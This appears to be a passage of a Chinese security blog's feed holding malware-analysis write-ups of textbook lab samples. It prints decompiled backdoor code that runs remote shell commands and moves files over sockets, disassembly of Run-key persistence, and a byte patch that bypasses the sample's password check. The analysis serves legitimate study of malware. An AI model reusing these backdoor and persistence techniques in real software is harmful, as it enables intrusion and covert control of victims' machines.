[ebp-40Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *String; <span class="comment">// [esp+20h] [ebp-408h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+24h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">1024</span>]; <span class="comment">// [esp+28h] [ebp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_401E60(Str1, <span class="number">1024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, Str2, <span class="built_in">strlen</span>(Str2)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    String = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    v13 = atoi(String);</span><br><span class="line">    Sleep(<span class="number">1000</span> * v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, aUpload, <span class="built_in">strlen</span>(aUpload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    v2 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    v10 = atoi(v2);</span><br><span class="line">    v11 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    <span class="keyword">if</span> ( sub_4019E0(name, v10, v11) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, aDownload, <span class="built_in">strlen</span>(aDownload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    v3 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    v8 = atoi(v3);</span><br><span class="line">    lpFileName = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401870(name, v8, lpFileName) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, aCmd_0, <span class="built_in">strlen</span>(aCmd_0)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    hostshort = atoi(v4);</span><br><span class="line">    Command = strtok(<span class="number">0</span>, asc_40C0A4);</span><br><span class="line">    Stream = _popen(Command, Mode);</span><br><span class="line">    <span class="keyword">if</span> ( !Stream )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401790(name, hostshort, Stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      _pclose(Stream);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(Stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncmp</span>(Str1, aNothing, <span class="built_in">strlen</span>(aNothing));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>几个关键点</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>地址</th>
<th>字符串命令格式</th>
<th>行为</th>
</tr>
</thead>
<tbody><tr>
<td>sleep</td>
<td>402076</td>
<td>sleep secs</td>
<td>sleep</td>
</tr>
<tr>
<td>upload</td>
<td>4019e0</td>
<td>upload port filename</td>
<td>通过端口port连接远程主机并读取内容，然后在本地创建filename文件</td>
</tr>
<tr>
<td>download</td>
<td>401870</td>
<td>download port filename</td>
<td>读取文件filename并且通过端口port发送到远程主机</td>
</tr>
<tr>
<td>cmd</td>
<td>402268</td>
<td>cmd port command</td>
<td>用cmd命令行运行shell命令，通过端口将输出发送到远程主机</td>
</tr>
<tr>
<td>nothing</td>
<td>402356</td>
<td>nothing</td>
<td>无操作</td>
</tr>
</tbody></table>
<p>很明显，这里实现了后门的功能。但是还有一点，<code>upload</code>和<code>download</code>的功能好像与名称相反emm？？？还是不要纠结名字了吧。</p>
<p>跳转到<code>401b35</code>，出现了get请求，http协议，请求<code>http://www.practicalmalwareanalysis.com</code>的80端口。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211118000720718.png" alt="image-20211118000720718"></p>
<h3 id="另一种crack密码abcd姿势"><a href="#另一种crack密码abcd姿势" class="headerlink" title="另一种crack密码abcd姿势"></a>另一种crack密码abcd姿势</h3><p>另一种修改的方法。</p>
<p>先反汇编下指令。直接填充</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B8 01 00 00 00 			mov eax,0x1</span><br><span class="line">C3						ret</span><br></pre></td></tr></table></figure>



<p>由于call指令准备堆栈，而RET指令负责清理栈，我们可以覆盖密码检查函数的开头指令 <code>402510</code>处。</p>
<p>编辑下二进制文件，binary，edit。</p>
<p>因为我们想在原来只占1字节的空间写入6个字节的指令，所以这里不选保持大小，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116154949368.png" alt="image-20211116154949368"></p>
<p>修改成功后</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155018687.png" alt="image-20211116155018687"></p>
<p>右键复制到可执行文件，全部复制</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155617453.png" alt="image-20211116155617453"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155805936.png" alt="image-20211116155805936"></p>
<p>检查下函数是否被成功禁用，使用命令参数-in重新调试。在<code>402510</code>处bypass，最后跳转到 <code>402B3F</code>。六条指令后，指向第一个命令行的参数的指针被push入栈，紧接着指向另外字符串（-in）的一个指针。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116161003640.png" alt="image-20211116161003640"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116161751006.png" alt="image-20211116161751006"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116164950265.png" alt="image-20211116164950265"></p>
<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>这个样本大致功能就可以看出，反向连接远程服务器，实现后门。其中几个命令行参数，安装/配置/删除等等，需要首先crack密码“abcd”。在程序运行时，首先将自己复制到 <code>system32</code>目录，创建服务并自启，然后删除自己。安装后，该程序会读取注册表的配置信息，get请求远程服务，通过socket套接字，建立连接。</p>
<p>反思: 这篇文章到了后面逻辑显得不是那么清晰，看出对od和ida的熟练度有待提高。希望下篇文章可以进步更多。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>后门</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>从反汇编看恶意程序的C语言结构</title>
    <url>/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>本文首发于奇安信攻防社区，原文链接：<a href="https://forum.butian.net/share/833">https://forum.butian.net/share/833</a></p>
<span id="more"></span>

<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文利用IDA分析4个简单的恶意程序，旨在基本掌握这4个恶意程序的C语言逻辑结构，同时这4个程序功能逐渐递增，循序渐进。笔者也是初学者，有些不足之处在所难免，请师傅们斧正</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>首先静态分析该exe文件，看下导入函数，其中一个调用了 <code>WININET.dll</code>中的 <code>InternetGetConnectedState</code> 函数，这个跟其他调用 <code>kernel32.dll</code> 中的函数相比，显得有些特殊。</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211023170231536.png" alt="image-20211023170231536"></p>
<p>查阅文档可知，这是一个 判断本地网络连接状态的函数，连接成功返回1，连接失败返回0</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetgetconnectedstate">互联网连接状态功能 （wininet.h） - win32 应用程序|微软文档 (microsoft.com)</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InternetGetConnectedState</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD lpdwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   dwReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>找到了main 函数，就从这里开始分析</p>
<p><code>main</code>函数位于<code>401040</code>，调用了<code>401000</code>处的函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024100414924.png" alt="image-20211024100414924"></p>
<p>跳过去看看    </p>
<p>上面一大堆没用的是编译器生成的，不要陷入其中</p>
<p>看到该区段的权限是 可读/可执行，并且调用了 <code>InternetGetConnectedState</code> 函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024095211845.png" alt="image-20211024095211845"></p>
<p>不看流程图的话大概也可以看出这是一个 if 语句的汇编代码，<code>cmp [ebp+var_4] ，0</code> ，根据结果跳转到不同的分支</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024100555118.png" alt="image-20211024100555118"></p>
<p>在 <code>View-&gt;Graphs-&gt;Flow chart</code>可以查看流程图，相比较于空格的 流程图，更简洁明了</p>
<p>这里使用cmp指令对保存了返回结果的eax寄存器与0比较，然后使用 jz 指令控制执行流。上面我们提到，当 建立网络连接时，<code>InternetGetConnectedState </code>函数返回1，否则返回0. 如果结果是1，0标志位（ZF）会被清除，jz跳转到1所在的<code>false</code>分支，否则跳转到<code>true</code>分支</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024100839298.png"></p>
<p>下面分析这个位于 <code>40105f</code>处的子过程</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024103413308.png" alt="image-20211024103413308"></p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024102412365.png" alt="image-20211024102412365"></p>
<p>其实这里是<code> printf</code> 函数，但是我们并没有看到一些printf函数的特征，这就需要去找一些其他的特征来证明这里是<code>printf</code>函数</p>
<p>在调用这个函数之前，都向栈中<code>push</code>了 一串 格式化字符串，并且结尾是<code> \n</code> 换行符，因此可以推出这里调用的函数就是 <code>printf</code></p>
<p>上面都是是根据静态分析得出的结论，真正的结果还是要实践检验一下</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024104729701.png" alt="image-20211024104729701"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个恶意代码的主要功能就是检查是否存在 <code>Internet</code>连接，存在输出1，否则输出0。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h4 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h4><p>首先还是看到这个pe文件的导入表</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024113751290.png" alt="image-20211024113751290"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InternetOpenUrl: 通过FTP或 HTTP URL打开一个原始资源。如果连接成功建立，则返回一个有效的句柄，如果连接失败，则返回 NULL</span><br><span class="line">internetclosehandle ：关闭句柄，成功关闭返回 true，否则返回false</span><br><span class="line">InternetReadFile： 从InternetOpenA打开的句柄读取数据</span><br><span class="line">InternetGetConnectedState： 验证网络连接状态</span><br><span class="line">InternetOpenA: 设置用户代理，即HTTP的 user-agent 头</span><br></pre></td></tr></table></figure>



<p>看到其中的一些字符串，在结合上面调用的 api函数，不难猜出，要访问的url地址</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024122037986.png" alt="image-20211024122037986"></p>
<p>接着来分析 main 函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024161416764.png" alt="image-20211024161416764"></p>
<p><code>401000</code> 处这里就不说了，和前面一样</p>
<p>但是401000 这里还调用的 <code>40117f</code>，跳过去看看</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024162008554.png" alt="image-20211024162008554"></p>
<p>这个结构很像前面分析的 <code>printf </code>函数，那我们再往前看一看。</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024162045209.png" alt="image-20211024162045209"></p>
<p>果然，在push入栈中也有一串格式化的字符串，基本可以确定<code> 40117f</code> 处的函数是 <code>printf</code>函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024163400472.png" alt="image-20211024163400472"></p>
<p>同时，main 函数中还调用了另一个<code> 401040</code>函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024163841168.png" alt="image-20211024163841168"></p>
<p>这里包含了所有 前面发现的 WinINet api的调用。首先调用了<code> InternetOpen</code> ，以初始化对<code>WinINet</code>的使用。在这之前，将 <code>Internet Explorer 7.5</code> <code> push</code> 入栈，当作 User-Agent 头部，接着调用 <code>InternetOpenUrl</code> ，打开该静态网页</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024164123810.png" alt="image-20211024164123810"></p>
<p>可以看到，调用完 <code>InternetOpenUrl </code>后，返回值被赋值给了hFIle，并接着与0比较，如果等于0会返回，否则跳转到<code>40109D</code>，hFile被传递给<code>InternetReadFIle</code>函数。</p>
<p><code>InternetReadFile</code> 函数用于从<code> InternetOpenUrlA</code>打开的网页中读取内容。在调用完后，会和0比较，如果为0，该函数会关闭句柄并终止，否则会跳转到 <code>4010E5</code>，逐步比较 buffer 数组 与每个字符的值， </p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024164448907.png" alt="image-20211024164448907"></p>
<p>这里有注释会好很多&lt;!—  ,否则的话，最开始的 3c 对应的ASCII码是 &lt;，也可以一一对应 出 &lt;!— ，这是html中注释的开始部分。</p>
<p>这时候就可以猜测存在 http 交互</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211024165314833.png" alt="image-20211024165314833"></p>
<p>因此大概就可以确定，如果 buffer 的前 4个字节与 &lt;!— 匹配成功的话，第5个字符就会被移到 AL 中并返回。</p>
<p>接着分析 main 函数，</p>
<p>看到在 401173 处 ，调用了 sleep 函数，传递的参数为 0xEA60h，即60000ms，1min</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025010417268.png" alt="image-20211025010417268"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025011101939.png" alt="image-20211025011101939"></p>
<p>该恶意样本检查是否有可用的网络连接，如果不存在，终止运行，否则返回 true，使用代理去下载其中包含的一个网址中的内容，这个网址包含注释，并且将printf解析后的字符串 “success： Parsed command is %c”到屏幕，输出成功的话，会sleep一分钟。这种方式是通过注释来隐藏指令，使得恶意代码看起来像是访问正常网页。</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h4 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h4><p>还是先看看导入表，一些旧东西</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025013425602.png" alt="image-20211025013425602"></p>
<p>修改注册表的api函数， RegSet ValueExA和 RegOpenKeyExA 一起用于向注册表中插入信息，在设置应用程序启动项/开机自启时，通常会使用这两个函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025014149215.png" alt="image-20211025014149215"></p>
<p>字符串也是发现了一些很有意思的，在临时目录会生成 cc.exe 文件，还会去修改注册表的自启动项目录</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025013731743.png" alt="image-20211025013731743"></p>
<p>下面接着看main 函数，与上一个恶意样本很像，接下来就找不同</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025014836872.png" alt="image-20211025014836872"></p>
<p>401000 处的检查网络连接和 401040处的下载网页与 上一篇基本相同，而不同的是这里多了对401030的调用</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025105418100.png" alt="image-20211025105418100"></p>
<p>仔细分析 401130处的函数</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025105628657.png" alt="image-20211025105628657"></p>
<p>根据注释可以看出是 switch 分支语句</p>
<p>看下它传入的参数，在调用前，传入了 argv 和 var_8 push入栈作为参数，这里的 argv就是argv[0]，就是这个程序的字符串引用，</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025110552536.png" alt="image-20211025110552536"></p>
<p>追踪 var_8 参数，发现在 40122D 处被设置为AL。此时 eax 存放的是上一个调用函数 401040的返回值，即html注释中的解析字符</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025110814576.png" alt="image-20211025110814576"></p>
<p>再来分析401130</p>
<p>arg_0 是IDA 自动生成的标签，用于标记调用函数前最后一个被push入栈的参数，所以这里的 arg_0 是解析得到的html指令字符，并赋值给 var_8，接着加载到ecx中执行，减去61h，因此，如果传入的arg_0 =a，执行sub指令后，ecx归0</p>
<p>接下来 cmp ecx 和4，检查 arg_0 是否是 a-e 中的某个字符，如果不是，ja 跳转到 401153，如果是的话，这个指令字符放入edx中，被用作跳转表的索引，看到下面 edx*4，因为这是switch结构，跳转表是一组指向不同函数的地址表，每个地址的大小占4个字节，而下面也正如我们所料，跳转表有5条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401130                 push    ebp</span><br><span class="line">.text:00401131                 mov     ebp, esp</span><br><span class="line">.text:00401133                 sub     esp, 8</span><br><span class="line">.text:00401136                 movsx   eax, [ebp+arg_0]</span><br><span class="line">.text:0040113A                 mov     [ebp+var_8], eax</span><br><span class="line">.text:0040113D                 mov     ecx, [ebp+var_8]</span><br><span class="line">.text:00401140                 sub     ecx, 61h ; &#x27;a&#x27;  ; switch 5 cases</span><br><span class="line">.text:00401143                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401146                 cmp     [ebp+var_8], 4</span><br><span class="line">.text:0040114A                 ja      def_401153      ; jumptable 00401153 default case</span><br><span class="line">.text:00401150                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:00401153                 jmp     ds:jpt_401153[edx*4] ; switch jump</span><br><span class="line">.text:0040115A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040115A</span><br><span class="line">.text:0040115A loc_40115A:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:0040115A                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:0040115A                 push    0               ; jumptable 00401153 case 97</span><br><span class="line">.text:0040115C                 push    offset PathName ; &quot;C:\\Temp&quot;</span><br><span class="line">.text:00401161                 call    ds:CreateDirectoryA</span><br><span class="line">.text:00401167                 jmp     loc_4011EE</span><br><span class="line">.text:0040116C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116C</span><br><span class="line">.text:0040116C loc_40116C:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:0040116C                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:0040116C                 push    1               ; jumptable 00401153 case 98</span><br><span class="line">.text:0040116E                 push    offset Data     ; &quot;C:\\Temp\\cc.exe&quot;</span><br><span class="line">.text:00401173                 mov     eax, [ebp+lpExistingFileName]</span><br><span class="line">.text:00401176                 push    eax             ; lpExistingFileName</span><br><span class="line">.text:00401177                 call    ds:CopyFileA</span><br><span class="line">.text:0040117D                 jmp     short loc_4011EE</span><br></pre></td></tr></table></figure>



<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211025145148050.png" alt="image-20211025145148050"></p>
<p>分别来看这5条语句调用函数的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040115A loc_40115A:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:0040115A                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:0040115A                 push    0               ; jumptable 00401153 case 97</span><br><span class="line">.text:0040115C                 push    offset PathName ; &quot;C:\\Temp&quot;</span><br><span class="line">.text:00401161                 call    ds:CreateDirectoryA</span><br><span class="line">.text:00401167                 jmp     loc_4011EE</span><br><span class="line">.text:0040116C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116C</span><br><span class="line">.text:0040116C loc_40116C:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:0040116C                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:0040116C                 push    1               ; jumptable 00401153 case 98</span><br><span class="line">.text:0040116E                 push    offset Data     ; &quot;C:\\Temp\\cc.exe&quot;</span><br><span class="line">.text:00401173                 mov     eax, [ebp+lpExistingFileName]</span><br><span class="line">.text:00401176                 push    eax             ; lpExistingFileName</span><br><span class="line">.text:00401177                 call    ds:CopyFileA</span><br><span class="line">.text:0040117D                 jmp     short loc_4011EE</span><br><span class="line">.text:0040117F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040117F</span><br><span class="line">.text:0040117F loc_40117F:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:0040117F                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:0040117F                 push    offset Data     ; jumptable 00401153 case 99</span><br><span class="line">.text:00401184                 call    ds:DeleteFileA</span><br><span class="line">.text:0040118A                 jmp     short loc_4011EE</span><br><span class="line">.text:0040118C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040118C</span><br><span class="line">.text:0040118C loc_40118C:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:0040118C                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:0040118C                 lea     ecx, [ebp+phkResult] ; jumptable 00401153 case 100</span><br><span class="line">.text:0040118F                 push    ecx             ; phkResult</span><br><span class="line">.text:00401190                 push    0F003Fh         ; samDesired</span><br><span class="line">.text:00401195                 push    0               ; ulOptions</span><br><span class="line">.text:00401197                 push    offset SubKey   ; &quot;Software\\Microsoft\\Windows\\CurrentVe&quot;...</span><br><span class="line">.text:0040119C                 push    80000002h       ; hKey</span><br><span class="line">.text:004011A1                 call    ds:RegOpenKeyExA</span><br><span class="line">.text:004011A7                 push    0Fh             ; cbData</span><br><span class="line">.text:004011A9                 push    offset Data     ; &quot;C:\\Temp\\cc.exe&quot;</span><br><span class="line">.text:004011AE                 push    1               ; dwType</span><br><span class="line">.text:004011B0                 push    0               ; Reserved</span><br><span class="line">.text:004011B2                 push    offset ValueName ; &quot;Malware&quot;</span><br><span class="line">.text:004011B7                 mov     edx, 